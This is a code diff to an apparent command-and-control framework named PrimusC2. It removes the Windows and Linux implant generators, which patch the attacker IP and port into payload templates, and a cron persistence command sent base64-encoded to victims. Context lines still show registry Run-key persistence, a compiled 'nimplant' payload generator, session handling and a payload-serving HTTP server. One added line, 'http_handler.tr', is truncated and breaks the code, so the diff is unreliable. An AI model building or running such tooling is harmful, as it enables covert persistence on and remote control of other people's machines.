@@ -31,8 +31,6 @@ def help():
     Menu Commands
     ------------------------------------------------------------------------------------------------------
     listeners -g                --> Generate a new listener on desired interface
-    winplant                    --> Generate a Windows Python Payload
-    linplant                    --> Generate a linux Python Payload
     nimplant                    --> Generate a compiled exe payload written in nim with advanced capabilities for windows
     sessions -l                 --> List callbacks
     sessions -i <sessions_val>  --> Enter a callback session
@@ -118,16 +116,10 @@ def target_comm(target_id, targets, num):
                     comm_out(target_id, persist2)
                     print(f'[*] Run the following command to cleanup the registry key: \nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v {ran_name} /f')
                     print('[+] The persistance technique has completed')
-            
-            
+             
             if message == 'GetAV':
                 pass
-                if targets[num][6] == 2:
-                    persist_command = f'echo "@hourly python3 /home/{targets[num][3]}/{payload_n}" | crontab -'
-                    persist_command = base64.b64encode(persist_command.encode())
-                    target_id.send(persist_command.encode())
-                    print('[*] Run the following command to clean up the crontab: \n crontab -r')
-                    print('[+] The persistance technique has completed')
+                
             else:
                 response = comm_in(target_id)
                 if response == 'exit':
@@ -176,58 +168,7 @@ def comm_handler():
         except:
             pass
 
-def winplant():
-    random_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
-    f_name= f'{random_name}.py'
-    file_loc = os.path.expanduser('~/PrimusC2/implant/winplant.py')
-    implant_loc = os.path.expanduser('~/PrimusC2/C2/Generated_Implants')
-    if os.path.exists(file_loc):
-        shutil.copy(file_loc, f_name)
-        shutil.move(f_name, implant_loc)
-    else:
-        print(f'[-] winplant.py not found in {file_loc}')
-    with open(f'{implant_loc}/{f_name}') as f:
-        patch_host = f.read().replace('INPUT_IP', str(host_ip))
-    with open(f'{implant_loc}/{f_name}', 'w') as f:
-        f.write(patch_host)
-        f.close()
-    with open(f'{implant_loc}/{f_name}') as f:
-        patch_port = f.read().replace('INPUT_PORT', str(host_port))
-    with open(f'{implant_loc}/{f_name}', 'w') as f:
-        f.write(patch_port)
-        f.close()
-    py_loc = os.path.join(implant_loc, f_name)
-    if os.path.exists(py_loc):
-        print(f'[+] {f_name} saved to {implant_loc}')
-        
-    else:
-        print('[-] An error occurred while saving the implant')
-        
 
-def linplant():
-    random_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
-    f_name= f'{random_name}.py'
-    file_loc = os.path.expanduser('~/PrimusC2/implant/linplant.py')
-    implant_loc = os.path.expanduser('~/PrimusC2/C2/Generated_Implants')
-    if os.path.exists(file_loc):
-        shutil.copy(file_loc, f_name)
-        shutil.move(f_name, implant_loc)
-    else:
-        print(f'[-] linplant.py not found in {file_loc}')
-    
-    with open(f'{implant_loc}/{f_name}') as f:
-        patch_host = f.read().replace('INPUT_IP', str(host_ip))
-    with open(f'{implant_loc}/{f_name}', 'w') as f:
-        f.write(patch_host)
-        f.close()
-    with open(f'{implant_loc}/{f_name}') as f:
-        patch_port = f.read().replace('INPUT_PORT', str(host_port))
-    with open(f'{implant_loc}/{f_name}', 'w') as f:
-        f.write(patch_port)
-        f.close()
-    py_loc = os.path.join(implant_loc, f_name)
-    if os.path.exists(py_loc):
-        print(f'[+] {f_name} saved to {implant_loc}')
 
 def nimplant():
     global host_ip
@@ -313,6 +254,7 @@ def web_payload_server():
     
     http_handler = SimpleHTTPRequestHandler
     http_handler.log_message = lambda *args, **kwargs: None
+    http_handler.tr
     server = http.server.ThreadingHTTPServer((host_ip, 8999), http_handler)
     
     print(f'[+] Payload server is running at http://{host_ip}:8999')
@@ -408,7 +350,7 @@ if __name__ == '__main__':
             if command == 'listeners -g':
                 print('[*] 1. Interface')
                 print('[*] 2. IP-Address')
-                print('[*] 3. Listener with redirector ')
+                print('[*] 3. Listener with redirector\n ')
                 listen_choice = (input('[*] Choose an option: '))
                 
                 if listen_choice == '1':
@@ -436,16 +378,6 @@ if __name__ == '__main__':
                 listener_handler()
                 listener_count +=1
                 web_payload_server()
-            elif command == 'winplant':
-                if listener_count > 0:
-                    winplant()
-                else:
-                    print('[-] Cannot generate payload without active listener')
-            elif command == 'linplant':
-                if listener_count > 0:
-                    linplant()
-                else:
-                    print('[-] Cannot generate payload without active listener')
             elif command == 'nimplant':
                 if listener_count > 0:
                     nimplant()
